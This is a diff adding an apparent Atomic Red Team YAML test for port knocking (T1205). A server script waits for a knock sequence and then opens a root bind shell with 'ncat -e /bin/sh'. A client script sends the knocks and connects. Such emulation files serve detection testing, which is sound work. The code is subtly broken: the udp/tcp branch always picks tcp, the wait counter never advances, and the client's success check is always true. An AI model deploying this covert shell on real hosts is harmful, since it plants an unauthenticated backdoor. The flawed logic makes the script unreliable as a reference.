@@ -1,0 +1,162 @@
+---
+attack_technique: T1205
+display_name: Port Knocking
+
+atomic_tests:
+- name: Bind Shell After Sequence of Port Knocks - Server
+  description: |
+    Listen for a sequence of packets on specific ports for a specific protocol.  After the the sequence is received, create bind shell on a new listening port.
+
+    Note: This may be used in conjunction with the client.
+  supported_platforms:
+    - linux
+  input_arguments:
+    knock_protocol:
+      description: Protocol for knock - tcp or udp
+      type: String
+      default: udp
+    knock_port_sequence:
+      description: CSV of UDP ports that define a knock
+      type: String
+      default: 40000,41000,40000,42000,40000,43000
+    listening_port:
+      description: Port to start listening on after knock
+      type: String
+      default: 54321
+    max_listen_seconds:
+      description: Maximum number of seconds to listen for sequence before stopping and to listen on opened port
+      type: Integer
+      default: 300
+  dependencies:
+  - description: |
+      tshark must be installed  (Terminal Wireshark - https://www.wireshark.org/)
+    prereq_command: |
+      which tshark
+    get_prereq_command: |
+      Install tshark (Terminal Wireshark - https://www.wireshark.org/)
+  - description: |
+      ncat must be installed
+    prereq_command: |
+      which ncat && ncat --version
+    get_prereq_command: |
+      Install ncat
+  executor:
+    name: bash
+    elevation_required: true
+    command: |
+      TSHARK_FILTER=""
+      GREP_PATTERN=""
+      if [ "#{knock_protocol}" = "tcp" ] ; then
+        PROTOCOL="tcp"
+      else
+        PROTOCOL="tcp"
+      fi
+
+      for PORT in $(echo "#{knock_port_sequence}" | sed "s/,/ /g")
+      do
+        if [ -z "$TSHARK_FILTER" ]
+        then
+          TSHARK_FILTER="($PROTOCOL dst port $PORT)"
+          GREP_PATTERN="'$PORT'"
+        else
+          TSHARK_FILTER="$TSHARK_FILTER or ($PROTOCOL dst port $PORT)"
+          GREP_PATTERN="$GREP_PATTERN(.*\n)*'$PORT'"
+        fi
+      done
+      TSHARK_FILTER="($TSHARK_FILTER) and inbound"
+
+      echo -e "Listen for sequence for #{max_listen_seconds} seconds\n"
+      tshark -Q -l -n -f "$TSHARK_FILTER" -T fields -E quote=s -e $PROTOCOL.dstport -a duration:#{max_listen_seconds} > /tmp/t1205_server.dat 2> /dev/null & TSHARK_PID=$!
+
+      SEQUENCE_FOUND=false
+      COUNTER=0
+      while [ $COUNTER -lt #{max_listen_seconds} ]
+      do
+        if grep -qPoz  "$GREP_PATTERN" /tmp/t1205_server.dat; then
+          echo -e '\n\nSequence found...'
+          SEQUENCE_FOUND=true
+          kill $TSHARK_PID
+          break
+        fi
+        sleep 1
+      done
+
+      if [ "$SEQUENCE_FOUND" = true ] ; then
+        echo -e 'Start shell server; listen for up to #{max_listen_seconds} seconds\n\n'
+        timeout #{max_listen_seconds}s ncat -nlp #{listening_port} -e /bin/sh
+      else
+        echo 'Sequence not heard...'
+      fi
+    cleanup_command:
+      rm -f /tmp/t1205_server.dat
+
+- name: Bind Shell After Sequence of Port Knocks - Client
+  description: |
+    Send a sequence of packets on specific ports for a specific protocol.  After the the sequence is send, attempt to connect to a bind shell on a new listening port.
+
+    Note: This may be used in conjunction with the server.
+  supported_platforms:
+    - linux
+  input_arguments:
+    server_ip:
+      description: IP of server to knock
+      type: String
+      default: 127.0.0.1
+    knock_protocol:
+      description: Protocol for knock - tcp or udp
+      type: String
+      default: udp
+    knock_port_sequence:
+      description: CSV of UDP ports that define a knock
+      type: String
+      default: 40000,41000,40000,42000,40000,43000
+    listening_port:
+      description: Port the server will listen on after knock
+      type: String
+      default: 54321
+  dependencies:
+  - description: |
+      ncat must be installed
+    prereq_command: |
+      which ncat && ncat --version
+    get_prereq_command: |
+      Install ncat (netcat)
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      SHELL_CONTACTED=false
+      for LOOP in {1..5} ;
+      do
+        for PORT in $(echo "#{knock_port_sequence}" | sed "s/,/ /g")
+        do
+          if [ "#{knock_protocol}" = "udp" ] ; then
+            echo -e "Knock\n" | ncat -u -w 1s #{server_ip} $PORT
+          else
+            echo -e "Knock\n" | ncat -w 1s #{server_ip} $PORT
+          fi
+          echo "Knock $PORT"
+          sleep 0.5
+        done
+        echo -e "Anyone home?\n\n"
+
+        sleep 2
+        cat <(echo 'echo Shell to host $HOSTNAME as user $USER successful.'  && sleep 1) | ncat #{server_ip} #{listening_port} > /tmp/t1205_client.dat 2> /dev/null
+        if [ -s /tmp/t1205_client.dat ] ; then
+          SHELL_CONTACTED=true
+          break
+        else
+          echo -e "Shell not there yet...\n\n"
+        fi
+      done
+
+      if [ SHELL_CONTACTED ] ; then
+        echo Shell successfully executed with port knock
+        cat /tmp/t1205_client.dat
+        exit 0
+      else
+        echo Unable to bind shell with port knock
+        exit 1
+      fi
+    cleanup_command:
+      rm -f /tmp/t1205_client.dat
